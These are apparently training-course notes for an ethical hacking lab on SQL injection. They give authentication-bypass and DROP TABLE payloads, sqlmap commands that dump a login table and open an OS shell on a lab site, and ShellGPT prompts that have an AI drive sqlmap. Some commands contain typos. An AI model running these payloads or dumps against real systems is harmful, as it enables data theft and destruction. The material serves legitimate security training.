# Module 15

## SQL Injection
SQL injection is a code injection technique that exploits security vulnerabilities in data-driven applications. It uses malicious SQL queries to manipulate databases, often to bypass authentication, access, or steal data. These attacks succeed when applications fail to properly validate user input before including it in a SQL statement.

**Objective**    
The primary goal of SQL injection is to interfere with the queries an application makes to its database. This interference is used to:

- Access unauthorized data: Read sensitive information like user credentials or personal data.
- Bypass security: Log into accounts without a password.
- Modify data: Insert, alter, or delete database records.

**Approach**
The attack exploits a simple flaw: failing to separate user input from code.

- Find an Input: Attackers target any user-input field (search box, login form, etc.).
- Craft a Payload: They enter a carefully crafted string that manipulates the intended SQL query's logic.
- Exploit the Flaw: If the input isn't properly sanitized, the database executes this malicious string as part of the code, not just as data, granting the attacker control over the query.

---

### 1. Perform SQL Injection attacks
SQL injection attacks are performed on SQL databases with weak codes that do not adequately filter, use strong typing, or correctly execute user input.

#### 1.1 SQL Injection on MSSQL Database

Payloads to check the injection
- `'OR 1=1 -- `

Operations on database
`Admin'; Insert into login values('john','apple123');--`  adding entry
`blah'; DROP TABLE users; --`

#### 1.2 Extract MSSQL Database with SQL MAP
**Steps**:
1. Navigate to http://www.moviescope.com/. A Login page loads; enter the Username and Password as sam and test, respectively. Click the Login button.
> If a Would you like Firefox to save this login for moviescope.com? notification appears at the top of the browser window, click Don’t Save.
2. Once you are logged into the website, click the View Profile tab on the menu bar and, when the page has loaded, make a note of the URL in the address bar of the browser.
3. Right-click anywhere on the webpage and click Inspect (Q) from the context menu, as shown in the screenshot.
4. The Developer Tools frame appears in the lower section of the browser window. Click the Console tab, type document.cookie in the lower-left corner of the browser, and press Enter.
5. Select the cookie value, then right-click and copy it, as shown in the screenshot. Minimize the web browser. Note down the URL of the web page.
6. Open a Terminal window and execute sudo su to run the programs as a root user (When prompted, enter the password toor).

- To retrieve cookie from console
  - `document.cookie`
- Now use the following commands to extract the database.
  - sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl="; --dbs
  - sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables
  - sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login --dump
- To get a shell
  - sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell
  - TASKLIST
  - help

**MySQL commands**
- `mysql -U qdpmadmin -h 192.168.1.8 -P passwod `
- `show databases;`
- `use qdpm;`
- `show tables'`
- `select * from users;`
- `show dtabases;`
- `use staff;`
- `show tables;`
- `select * from login;`
- `select * from user;`

You can also use other SQL injection tools such as Mole (https://sourceforge.net), jSQL Injection (https://github.com), NoSQLMap (https://github.com), Havij (https://github.com) and blind_sql_bitshifting (https://github.com).

---

### 2. Detect SQL Vulnerabilities using different tool
In this lab, you will learn how to test for SQL injection vulnerabilities using various other SQL injection detection tools.

#### 2.1 Detect SQLi with DSSS
[GitHub - stamparm/DSSS: Damn Small SQLi Scanner](https://github.com/stamparm/DSSS)
- `python3 dsss.py -u "http://testphp.vulnweb.com/artists.php?artist=1"`

#### 2.2 Detect SQLi with ZAP
Run automated scan and check the alerts tab.    
You can also use other SQL injection detection tools such as Damn Small SQLi Scanner (DSSS) (https://github.com), Snort (https://snort.org), Burp Suite (https://www.portswigger.net), HCL AppScan (https://www. hcl-software.com) etc. to detect SQL injection vulnerabilities.

---

### 3. Perform SQL Injection using AI
As an ethical hacker or penetration tester, you must have a sound knowledge on the integration of AI technology in identifying and exploiting SQL injection vulnerabilities

#### 3.1 Perform SQL Injection using ShellGPT
First we need to login to http://www.moviescope.com website and copy the cookie value.
- `sgpt --chat sql --shell “Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied in Step#3]' and enumerate the DBMS databases”`
- `sgpt --chat sql --shell “Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied in Step#3]' and enumerate the tables pertaining to moviescope database"`
-  `sgpt --chat sql --shell “Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied in Step#3]' and retrieve User_Login table contents `

---
---
